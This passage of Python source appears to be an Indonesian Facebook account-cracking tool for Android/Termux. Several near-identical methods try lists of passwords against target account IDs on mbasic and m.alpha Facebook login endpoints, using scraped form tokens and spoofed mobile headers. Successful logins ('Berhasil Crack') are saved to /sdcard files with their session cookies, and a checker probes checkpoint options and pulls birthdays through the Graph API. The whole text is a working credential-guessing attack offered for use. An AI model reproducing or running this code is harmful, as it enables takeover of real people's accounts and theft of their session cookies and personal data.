			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree('')
				tree.add(f'{kun}Gagal Crack')
				tree.add(f'{kun}{idf}|{pw}{x}')
				# tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				os.popen('play-audio c.mp3')
				prints(tree)
				open('/sdcard/AKUN-CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree("")
				tree.add(f'{hijo}Berhasil Crack{bv}')
				tree.add(f'{bv}TP : {tahunng(idf)}{hijo}')
				tree.add(f'{hijo}{idf}{hijo}➤{pw}')
				tree.add(f'{hijo}{kuki}{ung}')
				tree.add(f'{ung}{ua}{x}')
				os.popen('play-audio o.mp3')
				prints(tree)
				open('/sdcard/AKUN-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				# cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#####-------ALPHA--------#
def metod6(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white]VALALP [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des) 
	ua = random.choice(usragent)
	ua2 = random.choice(usrgent2)
	ses = requests.Session()
	for pw in pwv:
		try:
			# if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'm.alpha.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.alpha.facebook.com/login/?source=auth_switcheronse_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ff6fb-29af-412a-bb00-83c94a1003f1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.alpha.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://p.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://p.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fp.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db97ff6fb-29af-412a-bb00-83c94a1003f1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ri5o69ef67k6d9s38l3tx1zz1hbv015tb7cdwb6deqa4u2svv%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			# twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
			po = ses.post('https://m.alpha.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree('')
				tree.add(f'{kun}Gagal Crack')
				tree.add(f'{kun}{idf}|{pw}{x}')
				# tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				os.popen('play-audio c.mp3')
				prints(tree)
				open('/sdcard/AKUN-CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree("")
				tree.add(f'{hijo}Berhasil Crack{bv}')
				tree.add(f'{bv}TP : {tahunng(idf)}{hijo}')
				tree.add(f'{hijo}{idf}{hijo}➤{pw}')
				tree.add(f'{hijo}{kuki}{ung}')
				tree.add(f'{ung}{ua}{x}')
				os.popen('play-audio o.mp3')
				prints(tree)
				open('/sdcard/AKUN-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				# cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#----------[ METODE-mobile]----------#		
def metod7(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[bold white] Reguler [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
	prog.advance(des) 
	ua = random.choice(usragent)
	ua2 = random.choice(usrgent2)
	ses = requests.Session()
	for pw in pwv:
		try:
			# if 'ya' in ualuh: ua = ualu[0]
			# nip=random.choice(prox)
			# proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree('')
				tree.add(f'{kun}Gagal Crack')
				tree.add(f'{kun}{idf}|{pw}{x}')
				# tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				os.popen('play-audio c.mp3')
				prints(tree)
				open('/sdcard/AKUN-CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree("")
				tree.add(f'{hijo}Berhasil Crack{bv}')
				tree.add(f'{bv}TP : {tahunng(idf)}{hijo}')
				tree.add(f'{hijo}{idf}{hijo}➤{pw}')
				tree.add(f'{hijo}{kuki}{ung}')
				tree.add(f'{ung}{ua}{x}')
				os.popen('play-audio o.mp3')
				prints(tree)
				open('/sdcard/AKUN-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				# cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


opsi = []
def sesi(res):
	response = parser(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
	r = parser(ses.post('https://mbasic.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		opsi.append(i.text)
	return opsi	
	
def cek_opsi(idf,pw,ua):
	akun = ''
	try:
		token = open('.kokitoken.txt','r').read()
		bas = {"cookie":open('.kokicookie.txt','r').read()}
		ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
		m, d, y = ttl.split('/')
		m = tete[m]
		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n [{kk}>{P}] lahir  : {kk}{d} {m} {y}{P}           '
		mek = f"{idf}|{pw}|{day} {month} {year}"
		if 'file' in detek:pass
		else:open('/sdcard/AKUN-CP/'+cpc,'a').write(mek+'\n')
	except:
		month = ""
		day = ""
		year = ""
		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}'
		if 'file' in detek:pass
		else:open('/sdcard/AKUN-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
	try:
		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua}
		res = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr',headers=h2).text
		ress = parser(res, 'html.parser')
		form = ress.find('form',{'method':'post'})
		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
		data2.update({
					'email':idf,
					'pass':pw})
		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
		ress = parser(res, 'html.parser')
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			akun += f'\n [{hh}>{P}] {hh}hore akun tap yes🎉{P}                       '
		else:
			if(len(sesi(res))==0):
				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
					akun += f'\n [{kk}>{P}] akun terpasang auten                     '
				else:
					cok = convert(ses.cookies.get_dict())
					akun += f'\n [{hh}>{P}] akun tidak checkpoint                       \n [{hh}>{P}] cookie : {cok}'
			else:
				akun += f'\n [{kk}>{P}] terdapat {len(opsi)} opsi :                     '
				o = 0
				for cp in opsi:
					o+=1
					akun += f'\n [{kk}{o}{P}] {cp}               '
		opsi.clear()
	except Exception as e:
		akun += f'\n [{M}>{P}] kata sandi salah / spam                      '
	print('\r'+ akun)
	print('\r                                                                       ')
	
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))

###----------#[ CREAT FILE ]#----------###
def memulai():
	try:os.mkdir('/sdcard/AKUN-OK')
	except:pass
	# try:os.mkdir('/sdcard/DUMP-FILE')
	# except:pass
	try:os.mkdir('/sdcard/AKUN-CP')
	except:pass
	login()
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	memulai()

# #----------[ SYSTEM-CONTROL ]----------#	
# if __name__=='__main__':
	# try:os.mkdir('OK')
	# except:pass
	# try:os.mkdir('CP')
	# except:pass
	# login()

